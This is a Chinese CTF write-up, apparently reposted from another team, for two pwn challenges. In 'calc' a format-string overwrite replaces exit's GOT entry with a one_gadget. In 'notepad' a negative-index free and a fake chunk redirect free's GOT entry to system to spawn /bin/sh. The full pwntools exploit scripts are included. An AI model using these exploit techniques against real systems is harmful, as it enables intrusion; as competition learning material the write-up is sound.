为了方便先把北航大佬的write up拉下来，以后有空进行修改



# calc

程序是个模拟计算器，然后是个递归调用  
玩了好久没找到漏洞点  
然后就一个一个玩，在+的函数中发现了一个很好玩的函数,0x400C86  
有一句:  
`*(_QWORD *)(a1 + 8 * (*(unsigned __int8 *)(a1 + 0x948) + 4LL)) = *(_QWORD *)(a1 + 0x938);`  
这个
测试了这个代码发现有漏洞  
比如输入`++++++1+2`  
中途会把1放在bss段的那个数据区,并且位置和它递归的层数有关，相当于一个index  
相当于是一个数据存放的中转区  
观察一下附近的数据，发现有个`result: %lld\n`  
发现是0x400FF6中的  
`return printf((const char *)(a1 + 0x120), *(_QWORD *)(a1 + 0x938));`  
构思了一下，如果我们的`+`号足够多，就可以更改这个字符串的内容  
然后打印的是结果，于是就可以构造类似于  
`printf("%s",got_addr)`  
`printf("%n",got_addr)`  
这种payload，只要结果是got的地址就行了  
感觉这题出的非常好玩  
下面是payload,改掉exit_got为one_gadget就行了:  

```python  
from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./calc")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./calc")
else:
	p = remote(sys.argv[1],sys.argv[2])
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./calc")
	

def calcu(buf,conti = True):
	p.sendlineafter("Your input:\n",buf)

def conti(conti = True):
	if conti:
		p.sendafter("Y:N\n","Y")
	else:
		p.sendafter("Y:N\n","N")
	
def debugf():
	gdb.attach(p,"b *0x400920\nb printf")

def sendpayload(p1,write_addr):
	base = 0x6020c0
	target = 0x6021c0
	number = (target-base)/8
	payload = "-" * number
	res = 0
	while p1[:8] != "":
		par1 = u64(p1[:8].ljust(8,"\x00"))
		payload += str(par1) + "+"
		res += par1
		p1 = p1[8:]
	payload += str(write_addr - res)
	calcu(payload)

def change_exit():
	one_gadget = libc.address + 0xf1147
	log.success("one_gadget:"+hex(one_gadget))
	exit_got = elf.got["exit"]
	#debugf()
	for i in range(8):
		number = (one_gadget >> (i*8)) & 0xff
		if number == 0:
			payload = "%1$hhn"
		else:
			payload = "%{number}c%1$hhn".format(number=number)
		#payload = "%1c%1$n"
		sendpayload(payload,exit_got+i)
		if i != 7:
			conti()
		else:
			conti(False)

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
base = 0x6020c0
target = 0x6021c0
number = (target-base)/8
p1 = u64("%s".ljust(8,"\x00")) 
payload = "-"*number + str(p1) + "+" + str(elf.got["puts"]-p1)
calcu(payload)
#print p.recv(6)
puts_addr = u64(p.recvuntil("continue")[:6].ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
conti()
change_exit()
p.interactive()
```

# notepad
这个题看了很久发现没有漏洞,没有UAF之类的  
secret算法中,因为是个密码学选手,QAQ  
大概看了秘钥长度为8,是个能加密解密的,肯定是块加密,DES没跑了  
简单调试验证了下是个DES  
因为第一天给过提示，`key maybe the key`  
猜想是不是因为加密造成了堆溢出之类的,发现没有(以为长度不为8的倍数会有问题，检查了半天发现做了padding,还是个PKCS5,tql)  
看了半天发现只有free的时候没有check index是否是负数  
联想`key maybe the key`,感觉是不是可以在KEY上伪造堆块头部，然后free掉，造成free任意地址堆块  
在调试的时候发现DES KEY存的很奇怪,下标故意加了个1,感觉了一下好像是用来存储标志的  
因为这个题存放的时候是chunk_addr,inuse,size  
所以最后一位放1,前面写地址就行了  
前面写地址的时候还得注意找末尾是\x00的地址,分配多个堆块找到\x00对应的bss_addr,好像是20左右,具体看payload  
然后free掉DES KEY位置的堆块,再 malloc 一个堆块  
就可以达到修改 globle_heap 中的堆块地址了  
改为got_addr,先leak再写入,free -> system,再free一个内容是"/bin/sh"的堆块,getshell  
利用代码如下:  

```python
from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./notepad")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./notepad")
else:
	p = remote(sys.argv[1],sys.argv[2])
	libc = ELF("libc.so.6")
	elf = ELF("./notepad")

def add(size,content):
	p.sendlineafter(">> ","1")
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",content)

def edit(index,size,content):
	p.sendlineafter(">> ","2")
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",content)

def show(index):
	p.sendlineafter(">> ","3")
	p.sendlineafter("Index: ",str(index))

def free(index):
	p.sendlineafter(">> ","4")
	p.sendlineafter("Index: ",str(index))

def set_key(key):
	p.sendlineafter(">> ","5")
	p.sendlineafter(">> ","1")
	p.sendafter("Key: ",key)

def encrypt(index):
	p.sendlineafter(">> ","5")
	p.sendlineafter(">> ","2")
	p.sendlineafter("Index: ",str(index))
	
def decrypt(index):
	p.sendlineafter(">> ","5")
	p.sendlineafter(">> ","3")
	p.sendlineafter("Index: ",str(index))
	
def debugf():
	gdb.attach(p,"b *0x0000000000402077\nb free\nb *0x402471")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
size = 0x61
for i in range(20):
	add(size,(chr(ord("a")+i))*size)
set_key("\x50\x60".ljust(7,"\x00")+"\x01")
target = 0x6040E0
ori = 0x604E80
index = -151 + 5
debugf()
#print index
free(index)
add(size-0x10,"a"*(size-0x10))
payload = p64(elf.got["puts"]) + p64(1) + p64(0x51)
#debugf()
edit(20,len(payload),payload)
show(16)
puts_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
payload = p64(elf.got["free"]) + p64(1) + p64(0x51)
edit(20,len(payload),payload)
payload = p64(libc.symbols["system"])
edit(16,len(payload),payload)
edit(0,8,"/bin/sh\x00")
free(0)
p.interactive()
```